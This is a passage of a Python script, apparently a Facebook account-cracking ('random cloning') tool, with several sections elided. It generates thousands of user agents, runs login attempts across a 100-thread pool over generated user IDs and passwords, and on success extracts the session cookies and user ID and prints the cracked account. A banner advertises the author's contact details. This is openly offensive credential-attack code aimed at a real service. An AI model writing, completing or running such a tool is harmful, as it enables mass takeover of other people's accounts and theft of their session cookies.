...
for ua in range(5000):
    ...
    ugen.append(uaku2)
os.system("espeak \"Wall come To RAKIB Boss World sir, Bangladesh Random Cloning Start Please Wait\"")
logo=("""
...
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙉𝘼𝙈𝙀\33[38;5;196m        : [★]RAKIB\33[38;5;196m         ┃
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\33[38;5;196m    : [★]AB RAKIB\33[38;5;196m         ┃
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙂𝙄𝙏𝙃𝙐𝘽\33[38;5;196m      : [★]abrakib-07\33[38;5;196m       ┃
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙍𝙄𝙇𝙄𝙂𝙀𝙎𝙃𝙊𝙉\33[38;5;196m  : [★]𝗕𝗔𝗡𝗚𝗟𝗔𝗗𝗘𝗦𝗛𝗜\33[38;5;196m        ┃
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋\33[38;5;196m    : [★]+8801782727379\33[38;5;196m     ┃
...
def fuck():
    user=[]
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/ab.rakib.54966/')
    print(logo)
    ...
    with ThreadPool(max_workers=100) as Rakib:
        ...
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOOL CREATED BY RAKIB JOIN MY Github ')
...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[RAKIB-CP💔] {uid} • {ps}")
